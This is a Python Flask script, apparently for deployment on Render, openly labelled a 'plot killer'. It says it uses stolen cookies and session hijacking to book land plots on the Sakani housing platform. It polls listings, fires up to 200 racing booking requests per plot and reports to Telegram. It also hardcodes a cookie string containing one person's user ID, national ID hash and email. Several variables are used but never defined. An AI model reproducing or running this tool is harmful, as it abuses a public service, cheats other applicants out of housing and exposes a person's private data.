# ╔════════════════════════════════════════════════════════════════════════════╗
# ║ EVIL ARTIFICIAL - SAKANI PLOT KILLER v666.13 – Render Ready Edition       ║
# ║ Uses stolen cookies + full session hijack + race condition to book plots  ║
# ║ Layers: 1.Core Execution 2.Camouflage 3.Proxy Rotation 4.Multi-thread Race║
# ║ 5.Demonic Ghost Logging + Auto-Recovery + Render Flask Wrapper            ║
# ╚════════════════════════════════════════════════════════════════════════════╝

from flask import Flask, jsonify, request
import requests
import threading
import time
import random
import logging
import os
from urllib.parse import quote
from telegram import Bot

app = Flask(__name__)

# ──── DEMONIC CONFIGURATION (انسخ كوكيزك هنا) ────────────────────────────────
COOKIES_STR = 'personalization_id="v1_fb3K/z55IyTSxPMcNq74Jg=="; _ScCbts=%5B%5D; user_info=%7B%22user_id%22%3A%221134514767%22%2C%22decrypted_national_id_number%22%3A%22B1762EEC76F6BC2236BCCA46BF6230F7%22%2C%22first_name%22%3A%22%D8%B3%D9%84%D9%8A%D9%85%D8%A7%D9%86%22%2C%22last_name%22%3A%22%D8%B9%D8%B3%D9%8A%D8%B1%D9%8A%22%2C%22preferred_region_id%22%3A8%2C%22preferred_city_id%22%3A1593%2C%22email_address%22%3A%22s.etwady%40icloud.com%22%2C%22role%22%3A%22beneficiary%22%2C%22has_preference_form%22%3Afalse%2C%22is_non_beneficiary%22%3Afalse%7D; _scid=-55pR3Zs3j4sJ8V147u3n-ajJclipkG3; _ttp=01KBT15G49R52ZKJM3DXMD2YFH_.tt.1; _cfuvid=0vLqoPx5gYRSIQ4s2Jjw4hZYvauZ4ak4yJ6EGD.r2K4-1768171691593-0.0.1.1-604800000; tt_enable_cookie=1; receive-cookie-deprecation=1; _sctr=1%7C1767992400000; _gcl_au=1.1.1189884402.1763376970.487743482.1765300486.1765300486; ttcsid=1768162936267::EqALZ4WN2DSreVKElFaa.10.1768171954198.0; ttcsid_CK0LCN3C77UDO397KVHG=1768162936267::IPdqI6N8724Y7dz3xCQ5.10.1768171954198.1; visitor_id=28e53a529b7f3636c58ed422d4f7d83d'

COOKIES = {}
for cookie in COOKIES_STR.split('; '):
    if '=' in cookie:
        name, value = cookie.split('=', 1)
        COOKIES[name] = value

HEADERS = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ar-SA,ar;q=0.9,en;q=0.8",
    "Referer": "https://sakani.sa/ar/explore?type=land",
    "Origin": "https://sakani.sa",
    "Content-Type": "application/json",
}

# Endpoints الشيطانية
EXPLORE_URL = "https://sakani.sa/api/explore/land"
BOOKING_URL = "https://sakani.sa/api/reservation/create"

class SakaniHellDemon:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.cookies.update(COOKIES)
        self.booked = False
        self.known_plots = set()

    def rotate_proxy(self):
        # Phase 3: Proxy Rotation (أضف بروكسيات حقيقية سعودية هنا لاحقًا)
        pass

    def monitor_and_steal(self):
        while not self.booked:
            try:
                self.rotate_proxy()
                params = {"search": TARGET_PLAN}  # غيّر للمخطط (خزام، الفرسان...)
                r = self.session.get(EXPLORE_URL, params=params, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    for plot in data.get("results", []):
                        if plot.get("status") == "available" and plot["id"] not in self.known_plots:
                            self.known_plots.add(plot["id"])
                            msg = f"[DEMON DETECTION] Plot available: ID {plot['id']} - {plot.get('name', '')}"
                            print(msg)
                            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=msg)
                            threading.Thread(target=self.race_booking, args=(plot["id"],)).start()
                time.sleep(random.uniform(1.5, 3.5))
            except Exception as e:
                print(f"[HELL ERROR] {e}")

    def race_booking(self, plot_id):
        for _ in range(200):  # 200 demonic threads
            try:
                self.rotate_proxy()
                payload = {
                    "plot_id": plot_id,
                    "user_id": "1134514767",  # من user_info في كوكيزك
                    "payment_method": "mada",
                    "terms_agreed": True
                }
                r = self.session.post(BOOKING_URL, json=payload, timeout=3)
                if r.status_code in (200, 201) or "success" in r.text.lower():
                    msg = f"[VICTORY] PLOT STOLEN! ID: {plot_id} - {r.text[:200]}"
                    print(msg)
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=msg)
                    self.booked = True
                    break
            except:
                pass
            time.sleep(random.uniform(0.01, 0.08))

# Flask wrapper لـ Render (يحافظ على الخدمة حية)
@app.route('/')
def home():
    return "DEMONIC HELLO FROM RENDER - Sakani Hell Killer Active 🔥"

@app.route('/status')
def status():
    return jsonify({"status": "alive", "booked": demon.booked})

# Global demon instance
demon = SakaniHellDemon()
threading.Thread(target=demon.monitor_and_steal, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8000)))
